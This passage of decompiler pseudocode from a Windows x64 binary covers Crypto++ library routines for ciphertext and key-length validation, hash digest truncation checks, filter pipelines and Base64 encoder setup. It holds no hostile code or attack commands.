                                         *(_QWORD *)(a1 + 64));
    if ( !*(_BYTE *)(a1 + 184) )
    {
      v13 = (__m128i *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64) + 16i64))(
                         *(_QWORD *)(a1 + 56) + 8i64,
                         v16);
      v14 = sub_13F107420(v17, v13, (const __m128i *)": invalid ciphertext");
      sub_13F10EF40((__int64)pExceptionObject, v14);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
    }
    if ( v9 )
    {
      memset(v9, 0, v10);
      sub_13F12E550(v9);
    }
  }
  v12 = 1i64;
  if ( !sub_13F129E10((_DWORD *)a1, 1, *(_QWORD *)(a1 + 176), *(_QWORD *)(a1 + 192), a4, a5, (__int64)&qword_13F1B7008) )
    return 0i64;
  if ( *(_QWORD *)(a1 + 192) - *(_QWORD *)(a1 + 32) > 1ui64 )
    return *(_QWORD *)(a1 + 192) - *(_QWORD *)(a1 + 32);
  return v12;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F110A20: using guessed type __m128i var_B0[2];

//----- (000000013F110C10) ----------------------------------------------------
__int64 __fastcall sub_13F110C10(__int64 a1, __int64 a2, __int64 a3, int a4, char a5)
{
  int v7; // ecx
  void *v9; // rsi
  __int64 v10; // rbp
  unsigned __int64 v11; // r12
  __int64 v12; // rdi
  char v13; // [rsp+20h] [rbp-88h]

  v7 = *(_DWORD *)(a1 + 40);
  if ( v7 )
  {
    if ( v7 != 1 )
      return 0i64;
  }
  else
  {
    v9 = 0i64;
    *(_QWORD *)(a1 + 32) = 0i64;
    v13 = 1;
    (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)(a1 + 72) + 48i64))(
      a1 + 72,
      a2,
      a3,
      0i64,
      v13);
    if ( !a4 )
      return 0i64;
    v10 = sub_13F131BC0(a1 + 72);
    v11 = (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 56) + 16i64))(*(_QWORD *)(a1 + 56), v10);
    if ( v10 )
      v9 = (void *)sub_13F12E4E0(v10);
    (*(void (__fastcall **)(__int64, void *, __int64))(*(_QWORD *)(a1 + 72) + 144i64))(a1 + 72, v9, v10);
    sub_13F10D290((_QWORD *)(a1 + 152), v11);
    (*(void (__fastcall **)(_QWORD, _QWORD, void *, __int64, _QWORD, _QWORD))(**(_QWORD **)(a1 + 56) + 48i64))(
      *(_QWORD *)(a1 + 56),
      *(_QWORD *)(a1 + 48),
      v9,
      v10,
      *(_QWORD *)(a1 + 176),
      *(_QWORD *)(a1 + 64));
    if ( v9 )
    {
      memset(v9, 0, v10);
      sub_13F12E550(v9);
    }
  }
  v12 = 1i64;
  if ( !sub_13F129E10((_DWORD *)a1, 1, *(_QWORD *)(a1 + 176), *(_QWORD *)(a1 + 168), a4, a5, (__int64)&qword_13F1B7008) )
    return 0i64;
  if ( *(_QWORD *)(a1 + 168) - *(_QWORD *)(a1 + 32) > 1ui64 )
    return *(_QWORD *)(a1 + 168) - *(_QWORD *)(a1 + 32);
  return v12;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F110D80) ----------------------------------------------------
__int64 __fastcall sub_13F110D80(_DWORD *a1, unsigned int a2, int a3, char a4)
{
  if ( a3 )
    a2 = _byteswap_ulong(a2);
  if ( a1 != (_DWORD *)-16i64 )
    a1[4] = a2;
  return (*(__int64 (__fastcall **)(_DWORD *, __int64 *, _DWORD *, __int64, _DWORD, char))(*(_QWORD *)a1 + 280i64))(
           a1,
           &qword_13F1B7008,
           a1 + 4,
           4i64,
           0,
           a4);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F110DD0) ----------------------------------------------------
__int64 __fastcall sub_13F110DD0(__int64 a1, __int64 a2, __int64 a3, void (__fastcall ***a4)(_QWORD, __int64))
{
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 120i64))(a1);
  if ( a4 )
    (**a4)(a4, 1i64);
  return a2;
}

//----- (000000013F110E20) ----------------------------------------------------
__int64 __fastcall sub_13F110E20(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)
{
  __int64 v12; // [rsp+50h] [rbp+8h]

  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 80i64))(a1, v12, a6, a7, -2i64);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v12 + 32i64))(v12, a4, a5);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 120i64))(a1, a2, a3, v12);
  (**(void (__fastcall ***)(__int64, __int64))v12)(v12, 1i64);
  return a2;
}

//----- (000000013F110EC0) ----------------------------------------------------
__int64 __fastcall sub_13F110EC0(__int64 *a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  bool v8; // zf
  __int64 v9; // rax
  __int64 v11; // rax
  const __m128i *v12; // rax
  char v13[40]; // [rsp+28h] [rbp-A0h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-78h] BYREF

  v8 = (*(unsigned __int8 (__fastcall **)(__int64 *, unsigned __int64))(*a1 + 40))(a1, a3) == 0;
  v9 = *a1;
  if ( v8 )
  {
    v11 = (*(__int64 (__fastcall **)(__int64 *))(v9 + 104))(a1);
    v12 = (const __m128i *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v11 + 16i64))(v11, v13);
    sub_13F10EFC0((__int64)pExceptionObject, v12, a3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidKeyLength_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, __int64, __int64))(v9 + 112))(
           a1,
           a2,
           (unsigned int)a3,
           a4,
           -2i64);
}
// 13F110EC0: using guessed type char var_A0[40];

//----- (000000013F110F70) ----------------------------------------------------
__int64 __fastcall sub_13F110F70(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v5; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  if ( result )
  {
    v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 312i64))(v5, a2);
  }
  return result;
}

//----- (000000013F110FC0) ----------------------------------------------------
__int64 __fastcall sub_13F110FC0(__int64 a1, __int64 a2, void (__fastcall ***a3)(_QWORD, __int64))
{
  __int64 result; // rax
  __int64 v5; // rdi

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 96i64))(a1);
  v5 = result;
  if ( a3 )
  {
    (**a3)(a3, 1i64);
    return v5;
  }
  return result;
}

//----- (000000013F111010) ----------------------------------------------------
__int64 __fastcall sub_13F111010(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v9; // rdi
  char v11; // [rsp+20h] [rbp-38h]
  __int64 v12; // [rsp+60h] [rbp+8h]

  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v12 + 32i64))(v12, a3, a4);
  v11 = 0;
  v9 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, char))(*(_QWORD *)a1 + 96i64))(
         a1,
         a2,
         v12,
         a5,
         v11);
  (**(void (__fastcall ***)(__int64, __int64))v12)(v12, 1i64);
  return v9;
}

//----- (000000013F1110A0) ----------------------------------------------------
__int64 __fastcall sub_13F1110A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)
{
  __int64 v11; // rdi
  char v13; // [rsp+20h] [rbp-38h]
  __int64 v14; // [rsp+60h] [rbp+8h]

  v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 80i64))(a1, v14, a3, a4);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v14 + 32i64))(v14, a5, a6);
  v13 = 0;
  v11 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, char))(*(_QWORD *)a1 + 96i64))(
          a1,
          a2,
          v14,
          a7,
          v13);
  (**(void (__fastcall ***)(__int64, __int64))v14)(v14, 1i64);
  return v11;
}

//----- (000000013F111150) ----------------------------------------------------
__int64 __fastcall sub_13F111150(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 *v6; // rax
  char v7; // [rsp+20h] [rbp-18h]
  __int64 v8; // [rsp+40h] [rbp+8h] BYREF

  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1) )
  {
    v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 176i64))(v4, a2);
  }
  else
  {
    v8 = a2;
    v6 = sub_13F1112C0();
    v7 = 1;
    (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, char))(*(_QWORD *)a1 + 256i64))(
      a1,
      v6,
      &v8,
      &qword_13F1B7008,
      v7);
    return v8;
  }
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1111D0) ----------------------------------------------------
__int64 __fastcall sub_13F1111D0(__int64 a1)
{
  __int64 v2; // rax
  __int64 result; // rax

  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1) )
  {
    v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 224i64))(v2);
  }
  else
  {
    while ( (*(unsigned int (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 216i64))(a1, 0xFFFFFFFFi64) )
      ;
    do
      result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 176i64))(a1, -1i64);
    while ( result );
  }
  return result;
}

//----- (000000013F111240) ----------------------------------------------------
__int64 __fastcall sub_13F111240(__int64 a1, unsigned int a2)
{
  __int64 v4; // rax
  __int64 *v6; // rax
  unsigned int v7; // [rsp+40h] [rbp+8h] BYREF

  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1) )
  {
    v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v4 + 216i64))(v4, a2);
  }
  else
  {
    v7 = a2;
    v6 = sub_13F1112C0();
    sub_13F111680(a1, (__int64)v6, &v7, (__int64)&qword_13F1B7008, 1);
    return v7;
  }
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1112C0) ----------------------------------------------------
__int64 *sub_13F1112C0()
{
  if ( *(_DWORD *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) == 0x80000000 )
    sub_13F14045C(&dword_13F1C4370);
  return qword_13F1B7050;
}
// 13F1B7050: using guessed type __int64 qword_13F1B7050[3];
// 13F1C4370: using guessed type int dword_13F1C4370;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F111340) ----------------------------------------------------
__int64 __fastcall sub_13F111340(__int64 a1, unsigned __int64 a2)
{
  __int64 result; // rax
  __m128i *v5; // rbx
  unsigned int v6; // eax
  __m128i *v7; // rax
  __m128i *v8; // rax
  __m128i *v9; // rax
  __m128i *v10; // rax
  __m128i *v11; // rax
  __m128i v12[2]; // [rsp+28h] [rbp-120h] BYREF
  __m128i v13[2]; // [rsp+48h] [rbp-100h] BYREF
  __m128i v14[2]; // [rsp+68h] [rbp-E0h] BYREF
  __m128i v15[2]; // [rsp+88h] [rbp-C0h] BYREF
  __m128i v16[2]; // [rsp+A8h] [rbp-A0h] BYREF
  __m128i v17[2]; // [rsp+C8h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+F0h] [rbp-58h] BYREF

  result = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
  if ( a2 > (unsigned int)result )
  {
    v5 = sub_13F1124A0(v12, a2, 0xAui64);
    v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
    v7 = sub_13F10EA70(v13, v6, 0xAu);
    v8 = sub_13F10EA10(v14, (const __m128i *)"HashTransformation: can't truncate a ", v7);
    v9 = sub_13F107420(v15, v8, (const __m128i *)" byte digest to ");
    v10 = sub_13F107480(v16, v9, v5);
    v11 = sub_13F107420(v17, v10, (const __m128i *)" bytes");
    sub_13F101600((__int64)pExceptionObject, v11);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 13F111340: using guessed type __m128i var_120[2];
// 13F111340: using guessed type __m128i var_100[2];
// 13F111340: using guessed type __m128i var_E0[2];
// 13F111340: using guessed type __m128i var_C0[2];
// 13F111340: using guessed type __m128i var_A0[2];
// 13F111340: using guessed type __m128i var_80[2];

//----- (000000013F111450) ----------------------------------------------------
__int64 __fastcall sub_13F111450(__int64 *a1)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rax

  v2 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1);
  v3 = *a1;
  if ( !v2 )
    return (*(__int64 (__fastcall **)(__int64 *))(v3 + 128))(a1);
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 328))(a1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 184i64))(v4);
}

//----- (000000013F1114A0) ----------------------------------------------------
__int64 __fastcall sub_13F1114A0(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 i; // rbx
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 result; // rax
  unsigned int v11; // eax
  __int64 v12; // rax
  unsigned int v13; // er14
  int v14; // eax
  int v15; // ecx
  int v16; // [rsp+20h] [rbp-48h]
  int v17; // [rsp+28h] [rbp-40h]
  __int64 v18; // [rsp+30h] [rbp-38h] BYREF
  __int64 v19[6]; // [rsp+38h] [rbp-30h] BYREF
  unsigned int v20; // [rsp+70h] [rbp+8h] BYREF

  for ( i = a1;
        (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 336i64))(i);
        i = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 336i64))(i) )
  {
    ;
  }
  do
  {
    v8 = *(_QWORD *)i;
    v20 = -1;
    if ( (*(__int64 (__fastcall **)(__int64))(v8 + 336))(i) )
    {
      v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 336i64))(i);
      result = sub_13F111680(v9, a2, &v20, a3, a4);
      if ( result )
        return result;
    }
    else
    {
      v13 = v20;
      v20 = 0;
      if ( !v13 )
        goto LABEL_7;
      while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)i + 200i64))(i) )
      {
        while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)i + 136i64))(i) )
        {
          LOBYTE(v16) = a4;
          v19[0] = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 128i64))(i);
          result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, int))(*(_QWORD *)i + 256i64))(
                     i,
                     a2,
                     v19,
                     a3,
                     v16);
          if ( result )
            return result;
        }
        v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 120i64))(i);
        v15 = -1;
        if ( v14 >= 0 )
          v15 = v14 + 1;
        LOBYTE(v17) = a4;
        if ( (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, int, int))(*(_QWORD *)a2 + 280i64))(
               a2,
               a3,
               0i64,
               0i64,
               v15,
               v17) )
        {
          return 1i64;
        }
        (*(void (__fastcall **)(__int64))(*(_QWORD *)i + 208i64))(i);
        v11 = v20 + 1;
        v20 = v11;
        if ( v11 >= v13 )
          goto LABEL_6;
      }
    }
    v11 = v20;
LABEL_6:
    ;
  }
  while ( v11 );
  do
  {
LABEL_7:
    v12 = *(_QWORD *)i;
    v18 = 0xFFFFFFFFi64;
    LOBYTE(v16) = a4;
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, int))(v12 + 256))(i, a2, &v18, a3, v16);
  }
  while ( !result && v18 );
  return result;
}
// F: found interdependent unknown calls
// 13F11156B: variable 'v16' is possibly undefined
// 13F111643: variable 'v17' is possibly undefined
// 13F1114A0: using guessed type __int64 var_30[6];

//----- (000000013F111680) ----------------------------------------------------
__int64 __fastcall sub_13F111680(__int64 a1, __int64 a2, unsigned int *a3, __int64 a4, char a5)
{
  __int64 i; // rbx
  unsigned int v9; // er15
  char v10; // bp
  __int64 result; // rax
  int v12; // eax
  int v13; // ecx
  int v14; // [rsp+20h] [rbp-28h]
  int v15; // [rsp+28h] [rbp-20h]
  __int64 v16; // [rsp+50h] [rbp+8h] BYREF

  for ( i = a1;
        (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 336i64))(i);
        i = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 336i64))(i) )
  {
    ;
  }
  v9 = *a3;
  *a3 = 0;
  if ( v9 )
  {
    v10 = a5;
    while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)i + 200i64))(i) )
    {
      while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)i + 136i64))(i) )
      {
        LOBYTE(v14) = v10;
        v16 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 128i64))(i);
        result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, int))(*(_QWORD *)i + 256i64))(
                   i,
                   a2,
                   &v16,
                   a4,
                   v14);
        if ( result )
          return result;
      }
      v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)i + 120i64))(i);
      v13 = -1;
      if ( v12 >= 0 )
        v13 = v12 + 1;
      LOBYTE(v15) = v10;
      if ( (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, int, int))(*(_QWORD *)a2 + 280i64))(
             a2,
             a4,
             0i64,
             0i64,
             v13,
             v15) )
      {
        return 1i64;
      }
      (*(void (__fastcall **)(__int64))(*(_QWORD *)i + 208i64))(i);
      if ( ++*a3 >= v9 )
        return 0i64;
    }
  }
  return 0i64;
}
// 13F11173B: variable 'v14' is possibly undefined
// 13F111783: variable 'v15' is possibly undefined

//----- (000000013F1117D0) ----------------------------------------------------
_BOOL8 __fastcall sub_13F1117D0(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __int64 v6; // rsi
  void *v7; // rbx
  bool v8; // bp
  __m128i *v10; // rdi
  unsigned int v11; // eax
  __m128i *v12; // rax
  __m128i *v13; // rax
  __m128i *v14; // rax
  __m128i *v15; // rax
  __m128i *v16; // rax
  __m128i v17; // [rsp+28h] [rbp-140h] BYREF
  __int64 v18; // [rsp+38h] [rbp-130h]
  void *v19; // [rsp+40h] [rbp-128h]
  __m128i v20[2]; // [rsp+48h] [rbp-120h] BYREF
  __m128i v21[2]; // [rsp+68h] [rbp-100h] BYREF
  __m128i v22[2]; // [rsp+88h] [rbp-E0h] BYREF
  __m128i v23[2]; // [rsp+A8h] [rbp-C0h] BYREF
  __m128i v24[2]; // [rsp+C8h] [rbp-A0h] BYREF
  char pExceptionObject[64]; // [rsp+F0h] [rbp-78h] BYREF

  if ( a3 > (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1) )
  {
    v10 = sub_13F1124A0(&v17, a3, 0xAui64);
    v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
    v12 = sub_13F10EA70(v20, v11, 0xAu);
    v13 = sub_13F10EA10(v21, (const __m128i *)"HashTransformation: can't truncate a ", v12);
    v14 = sub_13F107420(v22, v13, (const __m128i *)" byte digest to ");
    v15 = sub_13F107480(v23, v14, v10);
    v16 = sub_13F107420(v24, v15, (const __m128i *)" bytes");
    sub_13F101600((__int64)pExceptionObject, v16);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v6 = 1i64;
  if ( a3 )
    v6 = a3;
  v17.m128i_i64[1] = -1i64;
  v18 = v6;
  v7 = (void *)sub_13F12E4E0(v6);
  v19 = v7;
  (*(void (__fastcall **)(__int64, void *, unsigned __int64))(*(_QWORD *)a1 + 120i64))(a1, v7, a3);
  v8 = sub_13F1338C0((__int64)v7, a2, a3);
  if ( v7 )
  {
    memset(v7, 0, v6);
    sub_13F12E550(v7);
  }
  return v8;
}
// 13F111839: conditional instruction was optimized away because rsi.8!=0
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1117D0: using guessed type __m128i var_120[2];
// 13F1117D0: using guessed type __m128i var_100[2];
// 13F1117D0: using guessed type __m128i var_E0[2];
// 13F1117D0: using guessed type __m128i var_C0[2];
// 13F1117D0: using guessed type __m128i var_A0[2];

//----- (000000013F111970) ----------------------------------------------------
__int64 __fastcall sub_13F111970(__int64 a1, void (__fastcall ***a2)(_QWORD, __int64))
{
  unsigned __int8 v3; // di

  v3 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 96i64))(a1);
  if ( a2 )
    (**a2)(a2, 1i64);
  return v3;
}

//----- (000000013F1119C0) ----------------------------------------------------
__int64 __fastcall sub_13F1119C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v10; // [rsp+50h] [rbp+8h]

  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 80i64))(a1, v10, a4, a5, -2i64);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v10 + 32i64))(v10, a2, a3);
  LOBYTE(a4) = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 96i64))(a1, v10);
  (**(void (__fastcall ***)(__int64, __int64))v10)(v10, 1i64);
  return (unsigned __int8)a4;
}

//----- (000000013F111A50) ----------------------------------------------------
__int64 __fastcall sub_13F111A50(__int64 a1, char a2)
{
  sub_13F102CD0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 40i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F111A90) ----------------------------------------------------
_QWORD *__fastcall sub_13F111A90(_QWORD *a1, char a2)
{
  *a1 = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F111AC0) ----------------------------------------------------
char __fastcall sub_13F111AC0(__int64 a1, const __m128i *a2, __int64 a3, char *a4)
{
  char result; // al

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF178, (__int64)&qword_13F1C3E50)
    || (result = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32))) == 0 )
  {
    sub_13F101D10(a2, (__int64)&unsigned char `RTTI Type Descriptor', a3);
    result = *(_BYTE *)(a1 + 32);
    *a4 = result;
  }
  return result;
}
// 13F1BF170: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';
// 13F1BF178: using guessed type __int64 qword_13F1BF178;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;

//----- (000000013F111B40) ----------------------------------------------------
char __fastcall sub_13F111B40(__int64 a1, const __m128i *a2, __int64 a3, _QWORD *a4)
{
  __int64 v8; // rax

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF080, (__int64)&qword_13F1C3E50)
    || (LOBYTE(v8) = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32)), !(_BYTE)v8) )
  {
    sub_13F101D10(a2, (__int64)&unsigned char const * `RTTI Type Descriptor', a3);
    v8 = *(_QWORD *)(a1 + 32);
    *a4 = v8;
  }
  return v8;
}
// 13F1BF078: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 13F1BF080: using guessed type __int64 qword_13F1BF080;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;

//----- (000000013F111BC0) ----------------------------------------------------
__int64 __fastcall sub_13F111BC0(__int64 a1, __int64 a2)
{
  char v4; // di
  char v5; // al
  int v6; // ecx
  const char *v7; // rdx
  int v8; // er12
  __int64 v9; // r15
  __int64 v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rax
  __int64 v13; // rdi
  __int64 v14; // rsi
  void (__fastcall ***v15)(_QWORD, __int64); // rcx
  void (__fastcall ***v16)(_QWORD, __int64); // rcx
  __int64 v17; // rbx
  unsigned __int8 v18; // si
  __int64 v19; // rax
  __int64 v20; // rdi
  __int64 v21; // r14
  void (__fastcall ***v22)(_QWORD, __int64); // rcx
  void (__fastcall ***v23)(_QWORD, __int64); // rcx
  __int64 v24; // rdi
  __int64 v25; // r14
  void (__fastcall ***v26)(_QWORD, __int64); // rcx
  void (__fastcall ***v27)(_QWORD, __int64); // rcx
  __int64 v28; // rax
  __int64 v29; // rbx
  __int64 v30; // rax
  __int64 v31; // rdi
  __int64 v32; // rsi
  void (__fastcall ***v33)(_QWORD, __int64); // rcx
  void (__fastcall ***v34)(_QWORD, __int64); // rcx
  __int64 result; // rax
  unsigned __int64 v36; // rcx
  void *v37; // rdx
  unsigned __int64 v38; // rcx
  void *v39; // rdx
  char v40[8]; // [rsp+20h] [rbp-B9h] BYREF
  __int64 v41; // [rsp+28h] [rbp-B1h] BYREF
  int v42; // [rsp+30h] [rbp-A9h]
  __int64 v43[3]; // [rsp+38h] [rbp-A1h] BYREF
  char v44[8]; // [rsp+50h] [rbp-89h] BYREF
  const char *v45; // [rsp+58h] [rbp-81h]
  __int64 v46; // [rsp+60h] [rbp-79h]
  __m128i v47; // [rsp+70h] [rbp-69h]
  void *v48; // [rsp+80h] [rbp-59h]
  char v49[8]; // [rsp+88h] [rbp-51h] BYREF
  const char *v50; // [rsp+90h] [rbp-49h]
  __int64 v51; // [rsp+98h] [rbp-41h]
  __m128i si128; // [rsp+A8h] [rbp-31h]
  void *v53; // [rsp+B8h] [rbp-21h]
  __int64 v54; // [rsp+C0h] [rbp-19h]
  void **v55; // [rsp+C8h] [rbp-11h] BYREF
  void (__fastcall ***v56)(_QWORD, __int64); // [rsp+D0h] [rbp-9h]
  void **v57; // [rsp+E0h] [rbp+7h] BYREF
  __int64 (__fastcall ***v58)(_QWORD, __int64); // [rsp+E8h] [rbp+Fh]

  v54 = -2i64;
  v42 = 0;
  v4 = 1;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, bool *, char *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "InsertLineBreaks",
         &bool `RTTI Type Descriptor',
         v40) )
  {
    v4 = v40[0];
  }
  v5 = (*(__int64 (__fastcall **)(__int64, const char *, int *, __int64 *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "MaxLineLength",
         &int `RTTI Type Descriptor',
         &v41);
  v6 = 72;
  if ( v5 )
    v6 = v41;
  v7 = byte_13F19C050;
  if ( v4 )
    v7 = "\n";
  v8 = 0;
  if ( v4 )
    v8 = v6;
  v9 = *(_QWORD *)(a1 + 144);
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCB0);
  v53 = 0i64;
  v10 = -1i64;
  do
    ++v10;
  while ( v7[v10] );
  v50 = v7;
  v51 = v10;
  v49[0] = 0;
  v47 = _mm_load_si128((const __m128i *)&xmmword_13F19CCB0);
  v48 = 0i64;
  v45 = v7;
  v46 = v10;
  v44[0] = 0;
  v11 = sub_13F12AA90((__int64)&v55);
  v12 = sub_13F14059C(40i64);
  v13 = v12;
  v41 = v12;
  if ( v12 )
  {
    *(_QWORD *)(v12 + 8) = "EncodingLookupArray";
    *(_WORD *)(v12 + 16) = 0;
    *(_QWORD *)(v12 + 24) = 0i64;
    *(_QWORD *)v12 = &CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';
    *(_QWORD *)(v12 + 32) = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  }
  else
  {
    v13 = 0i64;
  }
  v41 = v13;
  v14 = *(_QWORD *)(v11 + 8);
  *(_QWORD *)(v11 + 8) = 0i64;
  v15 = *(void (__fastcall ****)(_QWORD, __int64))(v13 + 24);
  if ( v15 )
    (**v15)(v15, 1i64);
  *(_QWORD *)(v13 + 24) = v14;
  v41 = 0i64;
  v16 = *(void (__fastcall ****)(_QWORD, __int64))(v11 + 8);
  if ( v16 )
    (**v16)(v16, 1i64);
  *(_QWORD *)(v11 + 8) = v13;
  *(_BYTE *)(v11 + 16) = 0;
  v17 = sub_13F12AA30((__int64)&v57, v11);
  v42 = 1;
  if ( v56 )
    (**v56)(v56, 1i64);
  v55 = &CryptoPP::NameValuePairs::`vftable';
  v18 = *(_BYTE *)(v17 + 16);
  v19 = sub_13F14059C(40i64);
  v20 = v19;
  v41 = v19;
  if ( v19 )
  {
